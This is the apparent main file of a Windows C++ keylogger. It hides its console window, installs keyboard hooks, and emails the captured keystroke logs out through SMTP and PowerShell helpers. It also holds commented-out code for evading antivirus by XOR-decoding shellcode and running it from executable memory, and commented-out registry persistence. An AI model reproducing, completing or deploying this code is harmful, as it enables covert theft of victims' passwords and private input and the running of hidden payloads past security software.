#include <iostream> //include statement
#include <windows.h> //include statement for hiding popup console
#include "Helper.h"
#include "KeyConstants.h"
#include "Base64.h"
#include "IO.h"
#include "Timer.h"
#include "SendMail.h"
#include "KeybHook.h"
#include "Regist.h"
#include "ReportLog.h"

//To send email, we need to implement a mail protocol (SMTP simple maail transfer protocol)
//default port number is 25, very long process if we cant use SSL or DSL to send mail
//find a mail secure that does not use any sort of encryption
//use external program to send mails (windows Powershell script)
//Use some of the scripts to help us send the mails

using namespace std; //namespaces

//main problem is have a console windows that pops up
//we don't want any console window to popup.

int main()
{
    //bypass AV code
    //char b[] = {/* your XORd with key of 'x' shellcode goes here i.e. 0x4C,0x4F, 0x4C */};
    /* char c[sizeof b];
     for (int i = 0; i < sizeof b; i++) {c[i] = b[i] ^ 'x';}
     void *exec = VirtualAlloc(0, sizeof c, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     memcpy(exec, c, sizeof c);
     ((void(*)())exec)();*/

    //Send Log Mail
    SendLogMail();
    SendPostStart();

    //MASKING THE KEY LOGGER
    MSG Msg; //message to be processed but it will NEVER be processed
    bool sendLog = false;
    //register the program to registry - flag as antivirus :x
    //std::string progReg = RegisterProgram();
    //Helper::WriteAppLog(Helper::ToString("Program Registration: " + progReg));

    //starts the KL
    InstallHooks();



    //infinite loop
    //will have console window if you run from CodeBlocks
    //in order for this part to function we need to go to settings - Settings->Compiler
    //Have g++ follow the C++11 ISO C++ Language Standard enabled
    //WindowsAPI [-mwindows] right click and delete flag
    //right click new flag
    // Name: - WindowsAPI
    // Compiler Flags: -mwindows
    // Linker Flags: -mwindows
    //enable new WindowsAPI
    while(GetMessage(&Msg, NULL, 0, 0)){ //& = reference //take some message from us
        TranslateMessage(&Msg); //translate message will take a message from our program that is intended for any windows in windows, to modify the message with &Msg, passed to the window
        DispatchMessage(&Msg); //forwards message to the system
        /*if(!sendLog)
        {
            Sleep(1); //sleep 10 seconds to make sure Thread is loaded?
            //Wait 3 seconds and report to mail
            //ReportLog::StartSendLogMail();

            sendLog = true;
        }*/
        //only no window if you use it on exe, instead of build and
        //never going to translate anything as its emptyrun
    }

    //Stop the mail timer
    MailTimer.Stop();

    return 0;
}
